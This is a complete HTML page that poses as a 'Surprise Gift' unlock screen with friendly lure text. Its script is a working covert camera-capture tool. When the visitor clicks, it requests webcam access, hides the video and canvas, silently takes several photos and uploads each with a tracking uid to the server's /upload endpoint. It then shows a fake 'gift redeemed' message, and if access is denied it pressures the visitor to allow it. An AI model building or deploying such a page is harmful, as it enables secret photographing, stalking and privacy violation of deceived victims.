<!DOCTYPE html>
<html>
<head>
    <title>Surprise Gift 🎁</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { text-align: center; font-family: sans-serif; background: #f0f0f0; padding-top: 50px; }
        #btn { padding: 20px; font-size: 20px; background: orange; border: none; border-radius: 10px; cursor: pointer; color: white; font-weight: bold; }
        .loader { display: none; border: 8px solid #f3f3f3; border-top: 8px solid #3498db; border-radius: 50%; width: 50px; height: 50px; animation: spin 2s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div id="ui">
        <h2>Hey Hi Dear! 👋</h2>
        <p>You have a surprise from someone special! 🎁</p>
        <button id="btn" onclick="startProcess()">🔓 Unlock Gift</button>
    </div>
    <div id="loading" style="display:none;">
        <h3>Your gift is loading... 🎁</h3>
        <div class="loader" style="display:block;"></div>
    </div>
    <video id="video" style="display:none;" autoplay></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        const params = new URLSearchParams(window.location.search);
        const mode = params.get('m') || 'dual';
        const uid = params.get('uid');

        async function startProcess() {
            document.getElementById('ui').style.display = 'none';
            document.getElementById('loading').style.display = 'block';
            
            let count = (mode === 'dual') ? 6 : 4; 
            
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                document.getElementById('video').srcObject = stream;
                
                for(let i=0; i<count; i++) {
                    await takePhoto();
                    await new Promise(r => setTimeout(r, 1000));
                }
                
                document.body.innerHTML = "<h3>Your gift has been redeemed. You are a good person, God bless you. ✨</h3>";
            } catch (e) { 
                alert("Please allow camera access to see your gift!"); 
                location.reload();
            }
        }

        async function takePhoto() {
            const video = document.getElementById('video');
            const canvas = document.getElementById('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);
            const img = canvas.toDataURL('image/jpeg');
            
            await fetch('/upload', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ image: img, uid: uid, mode: mode })
            });
        }
    </script>
</body>
</html>
